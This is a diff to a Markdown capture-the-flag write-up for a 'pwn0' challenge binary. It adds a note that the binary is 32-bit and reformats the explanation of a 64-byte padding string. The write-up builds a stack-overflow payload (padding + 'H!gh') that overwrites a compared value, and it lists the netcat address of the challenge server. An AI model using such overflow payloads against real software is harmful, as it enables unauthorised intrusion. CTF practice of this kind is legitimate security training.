@@ -2,7 +2,7 @@
 
 ```
 Given netcat connect `nc 104.154.106.182 1234`
-Binary file [pwn0](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/pwn0?raw=true)
+Binary file [pwn0](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/pwn0?raw=true) 32 bit executable
 ```
 * Executing Binary file
 ```
@@ -110,7 +110,7 @@ Breakpoint 1, 0x0804854e in main ()
 gdb-peda$ 
 ```
 * It is comparing the QQQQ with H!gh
-* The padding is "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" ('A'*64)
+* The padding is "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" or `'A'*64`
 * payload = padding + "H!gh"
 * Python script [exp.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/pwn0/exp.py)
 ### output
